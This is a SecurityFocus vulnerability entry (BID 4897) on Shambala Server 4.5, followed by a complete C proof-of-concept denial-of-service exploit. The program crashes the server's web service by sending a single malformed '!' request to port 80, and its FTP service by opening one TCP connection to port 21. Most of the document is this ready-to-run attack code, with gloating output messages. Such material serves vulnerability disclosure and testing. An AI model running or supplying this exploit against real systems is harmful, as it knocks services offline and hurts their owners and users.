source: http://www.securityfocus.com/bid/4897/info

Shambala Server is a FTP, Web, and Chat server targeted for the Small Office/Home Office user.

It has been reported that Shambala Server's web server may be prone to a denial of service vulnerability. The denial of service condition is a result of the web server failing to handle malformed requests. 

/******** shambalax.c ***********************************************************

*                                                       			*

* PoC exploit for the DoS in Shambala Server 4.5        			*

* as described in Telhack 026 Inc. S.A. #3 (BID:4897).  			*

* I have also built in a function that exploits another 			*

* DoS condition found by zillion a long long time ago.  			*

* Also refined my DoS a little bit by just using one                            *

* char that mess up Shambala.                                                   *

*                                                       			*

* By: Daniel Nystr?m (excE) <exce@netwinder.nu>         			*

*                                                       			*

*                                                       			*

* Notes:                                                                        *

* I found that zillion had only been almost right, it                           * 

* is not opening a lot of TCP connection that generates                         *

* the DoS that he found, it is just one TCP connection,                         *

* but it certainly has to do with bad connection handling                       *

* by Shambala.                                                                  *

*                                                                               *

*                                                                               *

*                                                                               *

* Credits:                                                                      *

* Zillion <zillion@safemode.org> - for discovering the FTP DoS                  *

*                                                       			*

* Greetz:                                                                       *

* Xenogen <*****@**********.***> - for promising to report any segfaults :)     *

* X-Rewt  <*****@**********.***> - Cuz he's in my school :P                     *

* Telhack 026 Inc. crew - STOP phreaking, START doing something more fun :))    *

*                                                                               *

*********************************************************** shambalax.c ********/



#include <stdio.h>

#include <stdlib.h>

#include <errno.h>

#include <string.h>

#include <sys/types.h>

#include <netinet/in.h>

#include <netdb.h>

#include <sys/socket.h>





int main(int argc, char *argv[])

{

	int sockfd;

	int port;

	int numbytes;

	

	struct sockaddr_in target;

	struct hostent *he;



	if (argc != 3)

	{

		fprintf(stderr, "\n-- Shambala Server 4.5 DoS exploit --\n");

		fprintf(stderr, "\nUsage: %s <target> <type>", argv[0]);

		fprintf(stderr, "\nTypes:");

		fprintf(stderr, "\n1  -  HTTPD DoS");

		fprintf(stderr, "\n2  -  FTP DoS\n\n");

		exit(1);

	}

	

	printf("\n-- Shambala Server 4.5 DoS exploit --\n\n");

	printf("-> Starting...\n");	

	printf("->\n");



	if ((he=gethostbyname(argv[1])) == NULL)

	{

		herror("gethostbyname");

		exit(1);

	}



	if ((sockfd=socket(AF_INET, SOCK_STREAM,0)) == -1)

	{

		perror("socket");

		exit(1);

	}



	/* HTTPD DoS */

	if(argv[2][0] == '1')

	{

		port = 80;

		target.sin_family = AF_INET;

		target.sin_port = htons(port);

		target.sin_addr = *((struct in_addr *)he->h_addr);

		bzero(&(target.sin_zero), 8);

		printf("-> Connecting to %s:80...\n", inet_ntoa(target.sin_addr));

		printf("->\n");

		if (connect(sockfd, (struct sockaddr *)&target, sizeof(struct sockaddr)) == -1)

		{

			perror("connect");

			exit(1);

		}

		printf("-> Sending httpd exploit string!! M4y th3 3v1L Shambala d13!!! :)\n");	

		printf("->\n");

		if(send(sockfd, "!\r\n", 3, 0) == -1)

		{

			perror("send");

			exit(1);

		}	

		close(sockfd);

	}

	else

	

	/* FTPD DoS */

	if(argv[2][0] == '2')

	{

                port = 21;

                target.sin_family = AF_INET;

                target.sin_port = htons(port);

                target.sin_addr = *((struct in_addr *)he->h_addr);

                bzero(&(target.sin_zero), 8);

                printf("-> Making a TCP connection (!which crashes server!) to %s:21...\n", inet_ntoa(target.sin_addr));

                printf("->\n");

                if (connect(sockfd, (struct sockaddr *)&target, sizeof(struct sockaddr)) == -1)

                {

                        perror("connect");

                        exit(1);

                }

                close(sockfd);

	}

	else

	{

		fprintf(stderr, "\n\nError: Bad type definition (use 1 or 2 for <type>).\n\n");

		exit(1);		

	}



	printf("-> Exploit finished nicely. %s's Shambala is probably dead by now.\n\n", argv[1]);



}



/* EOF - Shambala Server 4.5 DoS exploit     */

/* Daniel Nystr?m (excE) <exce@netwinder.nu> */